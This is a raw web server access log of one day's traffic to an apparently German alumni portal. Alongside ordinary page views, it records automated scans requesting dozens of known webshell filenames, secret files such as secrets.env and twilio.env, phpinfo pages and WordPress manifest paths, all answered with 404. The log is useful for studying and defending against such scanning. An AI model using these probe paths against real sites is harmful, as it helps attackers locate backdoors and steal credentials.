12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:00;;/wp-content/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:00;;/1.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:01;;/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:01;;/wp-admin/maint/maint.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:01;;/classwithtostring.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:01;;/dropdown.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:01;;/moon.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:01;;/0x.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:01;;/moon.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:02;;/autoload_classmap.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:02;;/inputs.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:02;;/default.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:02;;/fm.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:02;;/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:02;;/file.php?;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:02;;/alfa.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/buy.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/themes/twentytwentytwo/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/wp-admin/js/wp-conflg.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/wp-admin/wp-conflg.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/wp-admin/css/wp-conflg.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/manager.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/js/fm.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:03;;/item.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/plugins/Cache/footer.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/404.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/mail.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/wp-content/plugins/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/sx.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/wp-admin/maint/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/article.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/alfa.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:04;;/1.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:05;;/403.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:05;;/link.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:05;;/byp.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:05;;/ws.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:05;;/wp-trackback.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:05;;/.well-known/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:05;;/wp-includes/certificates/plugins.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/wp-content/themes/seotheme/mar.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/wp-admin/network/plugins.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/wp-admin/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/gmo.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/wp-includes/ID3/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/css/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/wp-admin/includes/xmrlpc.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:06;;/wp-includes/SimplePie/wp-login.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/wp-content/themes/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/filemanager/dialog.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/wp-admin/maint/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/wp-includes/Requests/Text/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/wp-includes/customize/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/index/function.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/uploads/autoload_classmap.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/wp-includes/css/dist/preferences/wp-login.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:07;;/wp-includes/style-engine/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/ww1.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/qqq.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/about/function.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/wp-includes/theme-compat/chosen.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/admin/function.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/css/colors/blue/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/wp-content/plugins/pwnd/as.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:08;;/wp-admin/setup-config.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/wp-admin/user/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/wp-admin/js/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/wp-content/upgrade/about.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/wp-includes/assets/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/wp-content/radio.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/wp-includes/fonts/index.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/.well-known/gecko-litespeed.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:09;;/.well-known/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/wp-content/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/wp-content/plugins/admin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/wp-content/themes/twentytwentytwo/index.php?p=;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/.well-known/log.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/class.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/bless.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/wp-includes/js/codemirror/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:10;;/wp-includes/block-patterns/index.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:11;;/lock360.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:11;;/bge.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:11;;/ifm.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:11;;/thxt.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:11;;/kairolin.php;GET;404
12482eb3b1c90c69ef0fab0333715fb333576c4f3875a905252c83f7f2072840;2025-11-21 09:36:12;;/siln.php;GET;404
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-21 09:40:43;/;/;GET;200
25197165a6eed2772ad022a22566b0ba36bc80911f4ba573c290295d66975243;2025-11-21 09:45:40;;/;GET;200
f86d7bd8453e8d9115b17d768c6645c2d1567e02ce79147e2a0b11d496e65e0a;2025-11-21 09:46:42;;/personen/alumni/schule/HS002;GET;200
ddf80d95c34dee42f9310f449a1917242067ddb653cd552377829989b07fc39b;2025-11-21 09:50:44;/;/;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-21 09:55:41;/;/;PROPFIND;405
febb25773df7972540af38879ed9ebf0d947bc5b562a83ed4d82cd8aa960149a;2025-11-21 09:57:03;;/;GET;200
d2c92c0377651c695770c9590fc174a9463caf7630dbc43dada09f8192ebe4b5;2025-11-21 10:00:31;;/personen/alumni/schule/67933;GET;200
febb25773df7972540af38879ed9ebf0d947bc5b562a83ed4d82cd8aa960149a;2025-11-21 10:02:49;;/webui/;GET;404
febb25773df7972540af38879ed9ebf0d947bc5b562a83ed4d82cd8aa960149a;2025-11-21 10:08:37;;/;GET;200
d0a4dc4dc166415b1824e0589e744c15ffdc5bb530cf18fb53f211966c2a27c5;2025-11-21 10:13:40;;/;GET;200
37449e0caa5a508b291d44ac8574eebf6b7f57760a0210e43b55215935c6595d;2025-11-21 10:16:21;;/personen/alumni/schule/67945;GET;200
febb25773df7972540af38879ed9ebf0d947bc5b562a83ed4d82cd8aa960149a;2025-11-21 10:21:16;;/geoserver/web/;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-21 10:21:43;/personen/alumni/details/felix-fischer;/personen/alumni/details/felix-fischer;GET;200
ef8305a0f1726fcfd8a7214d1ecd8e967768c28cb00c9aac37ccce7f4be73b22;2025-11-21 10:21:44;/;/;GET;200
9275eb1415cbd8131a720c599407eae65c4516e43a2e206cee02987d926fa258;2025-11-21 10:24:31;;/;GET;200
d79b432f61192bed40d96871d6ff3d75f0e405d76db0381eb7675ce19502e8c3;2025-11-21 10:29:54;;/personen/alumni/schule/4240628;GET;200
57ce1755969561156eb57b5f93feccc885eb82593dda4784e0db8211e7cf4a60;2025-11-21 10:37:31;;/;GET;200
a52c1e4b18767223e3a66cf667c9d8dd1f0a3f5775d317ca93541d044b245eb6;2025-11-21 10:40:32;;/;GET;200
bf203d1c40d18375acde26d4c78f58c8465d64bc1db3abc1e79b4d7c3d26371a;2025-11-21 10:43:34;;/personen/alumni/schule/66345;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-21 10:45:16;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testenrobots.txt;GET;404
61fd0af4a2cdb9183a7e34af1af3cff0931e089f6104b89ebbbda9e6bc043af0;2025-11-21 10:56:43;;/personen/alumni/schule/191073;GET;200
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 10:59:45;;/;GET;200
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 10:59:45;;/;GET;200
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 10:59:49;;/sendgrid.env;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 10:59:52;;/sendgrid.env;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 10:59:55;;/twilio.env;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 10:59:56;;/twilio.env;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:00;;/phpinfo/;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:01;;/phpinfo/;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:03;;/app_dev.php/_profiler/phpinfo;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:04;;/app_dev.php/_profiler/phpinfo;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:06;;/.config.yaml;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:08;;/.config.yaml;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:09;;/secrets.env;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:11;;/secrets.env;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:12;;/debug/default/view?panel=config;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:14;;/phpinfo.php;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:15;;/debug/default/view?panel=config;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:15;;/info/;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:16;;/phpinfo.php;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:18;;/info/;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:19;;/test;GET;404
52f0663b135cfe50950d2ea5e0e94c65cd6d7ff098915b8db0c674702f1b9d04;2025-11-21 11:00:21;;/test;GET;404
c04408f34a06a975b02ee212bc3d34537df678d11a1a60fad830921024f98bc7;2025-11-21 11:07:52;/;/;GET;200
c877069629ca315f963d663fde1bc8d62cfc44abc51f643de677ba5d536041ff;2025-11-21 11:09:25;;/personen/alumni/schule/68470;GET;200
a8af28b08813ebb857698ae3537e331ff55414dabe2a5972781925fb673af78f;2025-11-21 11:14:16;;/;GET;200
9a48c714727a75520960c4f66663ed2c668e09bf8aebc41f94de94cdfce71045;2025-11-21 11:23:12;;/rechtliches/datenschutz;GET;200
497d98eecfa509547cd2c2cea0dfd43ba7d56d77494b8532d8428c2a97a683ab;2025-11-21 11:28:39;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-21 11:29:21;;/;GET;200
163fc7d30b42abc08e91b21b7c03e5c98ec32013f24e4eddacf46a89b461d206;2025-11-21 11:29:21;/;/;GET;200
00164a83b5a875b2826bdb37bbce606a753d7e070e7c70d0d699a3ca4266bcb1;2025-11-21 11:36:05;;/personen/alumni/schule/190627;GET;200
deecd6b1509b8a43d9860fe51feb9c208505299db9559fa7d994df69019cebae;2025-11-21 11:48:58;;/rechtliches/green-data;GET;200
904ee9d9a5d60438e018385113a9c1b46c0cdcabaffbb860e5424c934589c8fd;2025-11-21 12:03:16;;/themen?category=kultur;GET;200
8f10c0ccee780d71f4348f9f5d22ba62a28469ce9e9f11cdfadc8e5d0e0f7d29;2025-11-21 12:07:15;;/themen/details/der-start-ins-studium;GET;200
459a22fc83f0bd63018f755da14238ad8ad883dc137ffc090a9c00993eb6f85d;2025-11-21 12:07:18;;/personen/alumni/schule/67933;GET;200
c39033a4db53cb73bc2a62f06d408a13f3f9ac6ddeea8ee5e12ce2aeae10cda2;2025-11-21 12:09:59;;/themen/details/abschied-aus-moabit;GET;200
0410cc5726850d06e131fd54d0f61d2541468c5b204931badfb734151757bb74;2025-11-21 12:11:27;;/aktuelles/stellenangebote;GET;200
56c8839cb1458ec6d616de798f8d52d9b3700cfb2382a4739638983db25255c4;2025-11-21 12:15:17;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
2f38f1e734cc2f7e3efcc7e1aea7e2aa2eb2da170db57cc5a7a42abc5c334f4b;2025-11-21 12:21:33;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
d985c20c25ee0bb134920bc2cbd21aa6aa0187d0d3024d6bf9290395acad7769;2025-11-21 12:22:53;;/personen/alumni/schule/67945;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-21 12:32:57;/personen/all/4;/personen/alumni/details/lisa-stache;GET;200
290191761fbf22c895dd9414a066fc80ff47751f0a3280001ae278ab18ef99aa;2025-11-21 12:35:01;;/;GET;200
926a3544186e5569cea769cdcaf94e393edffa039f348e623bbaaee872b85cbd;2025-11-21 12:36:22;;/personen/alumni/schule/5826;GET;200
1b22103ae9bc41f3caabb031e7de3834d37a92bd964dfca99673fb70b8421aba;2025-11-21 12:49:17;;/personen/alumni/schule/67210;GET;200
46a256bad355735bd0a910a71608a4983b212bf73fbf8fc182ea56d4a7706463;2025-11-21 12:53:44;;/;GET;200
c59b5785875fab3830ce12bba9d38d3a042465bdfe1a60d14f1e691ed48ab436;2025-11-21 13:02:18;;/personen/alumni/schule/MP002;GET;200
2643eb9eb71681aeba8574ac3f17ff868c7f948797418c49ce45f6dd61d0c2f6;2025-11-21 13:14:52;;/personen/alumni/schule/4440012;GET;200
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:11;;/;GET;200
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:13;;//wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:14;;//xmlrpc.php?rsd;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:14;;/;GET;200
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:15;;//blog/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:15;;//web/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:15;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:16;;//website/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:16;;//wp/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:16;;//news/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:16;;//2018/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:17;;//2019/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:17;;//shop/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:17;;//wp1/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:18;;//test/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:18;;//media/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:18;;//wp2/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:19;;//site/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:19;;//cms/wp-includes/wlwmanifest.xml;GET;404
021e46a5389a51b6726f51c5f429eb7df85f09949a9c24871af56eb91d359d98;2025-11-21 13:15:19;;//sito/wp-includes/wlwmanifest.xml;GET;404
9c1138dc26f45ce75ab269cb77f7b211b83c91e2982d3e4d6ca6144d20eb6b56;2025-11-21 13:18:24;;/themen/details/bucher-auf-dem-abstellgleis;GET;200
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:01;;/;GET;200
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:02;;//wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:02;;//xmlrpc.php?rsd;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:03;;/;GET;200
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:03;;//blog/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:03;;//web/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:03;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:04;;//website/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:04;;//wp/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:04;;//news/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:04;;//2018/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:05;;//2019/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:05;;//shop/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:05;;//wp1/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:05;;//test/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:06;;//media/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:06;;//wp2/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:06;;//site/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:07;;//cms/wp-includes/wlwmanifest.xml;GET;404
73b4eda7d8c28c91374af3dc6859f26dc8af2dde399aa38098f7183d3f9b92d4;2025-11-21 13:23:07;;//sito/wp-includes/wlwmanifest.xml;GET;404
c39d9d83b6421a2e10167e6f2a0a977c0094ae6c2a9c27de7cc30535a5570f47;2025-11-21 13:27:11;;/personen/alumni/schule/59043;GET;200
0a1accdcefa20ac77e0a67fd4301321fa5d8a8a739e2ef5fdab1f0d85f703a07;2025-11-21 13:32:01;;/gruppen;GET;200
5d06ed8cfcc2fc53c12800f0a1931005367a4917c066e5e22a2a591e0fb0cb1a;2025-11-21 13:34:56;/;/;PROPFIND;405
7fbc6a2404f5f88f50736fbd02e5e89a48f91ae2e812059e37d654779916a2de;2025-11-21 13:38:45;;/personen/alumni/schule/HS002;GET;200
6ca04099a0d612514779011a6c85df05740aa0f541385c233d7e8fd3bb69d50d;2025-11-21 13:44:25;;/personen/alumni/schule/5820;GET;200
4352efddbaa5c473f1ef213056302e83e3cfce98d2340e1bf83b86ec63276d66;2025-11-21 13:52:05;;/personen/alumni/schule/59026;GET;200
507ed97d62b952daf7322e0a8f071386d4ebbbfcd994915ca16786cc2074c64b;2025-11-21 13:59:11;;/;GET;200
9b3d46005c4817abbf014f239461921cdb258fa7874c6dc689721e4f477e5b80;2025-11-21 14:00:22;;/;GET;200
ffd6fabe959c7d6e03f99b4f6f4d0a6bad5c310a65941a65107efa6065ddf749;2025-11-21 14:00:30;;/sitemap.xml;GET;200
f1d09a8cd1b0b51f19270c0422620ae267f6747a3dfd4bd38ecdea0c02d361bd;2025-11-21 14:00:40;;/;GET;200
